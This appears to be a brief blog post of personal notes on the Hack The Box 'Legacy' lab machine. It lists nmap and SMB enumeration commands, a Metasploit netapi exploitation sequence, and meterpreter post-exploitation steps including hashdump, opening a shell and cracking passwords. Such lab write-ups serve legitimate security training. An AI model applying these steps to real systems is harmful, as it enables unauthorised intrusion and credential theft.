---
layout: post
title: Network Security
subtitle: HTB Legacy
cover-img: /assets/img/path.jpg
tags: [Pentesting, Vulnerability Assessment, CTF, NMAP, Meterpreter]
---

TCP scan - 
 ```
 SYN 
 ACK+SYN
 ACK
```

SYN scan -
```
SYN 
ACK+SYN
RST
```

#### Running NMAP

nmap -A -T4 -p- <i.p>
   •  Port 139, 445  open
      ◇ smbclient -L \\<ip>\
      ◇ enum4linux -a <ip>[ optional ]

⇒ msfconsole
   • search smb_version
      ◇  We dont't know the smb version here, so checked rapid7 website and got netapi
      ◇  search netapi
           • use 1 
           • set rhosts <ip>, <ip>/24
           • run/exploit

#### Meterpreter commands - 
   • getuid
   • sysinfo
   • help(optional)
   • hashdump
   • shell
      ◇ Will redirect to System32 
⇒ Crack the passwords


#### For detailed explanation : [Another approach](https://medium.com/@ranakhalil101/hack-the-box-legacy-writeup-w-o-metasploit-2d552d688336)



